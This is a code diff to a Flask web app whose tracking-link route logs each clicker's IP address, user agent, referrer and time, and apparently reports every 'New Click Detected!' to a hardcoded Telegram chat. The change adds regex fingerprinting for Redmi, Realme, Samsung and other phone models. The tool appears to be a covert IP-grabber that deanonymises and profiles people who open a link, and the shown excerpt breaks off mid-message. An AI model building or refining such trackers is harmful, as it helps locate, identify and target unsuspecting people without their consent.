@@ -3,6 +3,7 @@ import requests
 import uuid
 from datetime import datetime
 from user_agents import parse
+import re
 
 app = Flask(__name__)
 
@@ -12,18 +13,36 @@ CHAT_ID = 7591700804
 @app.route('/track/<link_id>')
 def track(link_id):
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent_string = request.headers.get('User-Agent')
+    ua_string = request.headers.get('User-Agent', '')
     referrer = request.headers.get('Referer')
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Parse device info nicely
-    ua = parse(user_agent_string)
-    device_name = f"{ua.device.brand or ''} {ua.device.model or ''}".strip() or "Unknown Device"
+    ua = parse(ua_string)
+    
+    # Primary detection
+    brand = ua.device.brand or ""
+    model = ua.device.model or ""
+    device_name = f"{brand} {model}".strip()
+
+    # Improved regex for Indian/Chinese phones (Redmi, Realme, etc.)
+    if not device_name or device_name == "Generic Android":
+        patterns = [
+            r'(Redmi|Xiaomi|Poco)[\s-]?([A-Za-z0-9]+)',
+            r'(Realme|Oppo|Vivo)[\s-]?([A-Za-z0-9]+)',
+            r'(Samsung)[\s-]?([A-Za-z0-9]+)',
+            r'(OnePlus)[\s-]?([A-Za-z0-9]+)'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, ua_string, re.I)
+            if match:
+                device_name = f"{match.group(1)} {match.group(2)}"
+                break
+
+    if not device_name:
+        device_name = "Unknown Mobile"
+
     os = ua.os.family
     browser = ua.browser.family
-
-    if device_name == "Unknown Device":
-        device_name = f"{os} - {browser}"
 
     message = f"""🔥 New Click Detected!
 
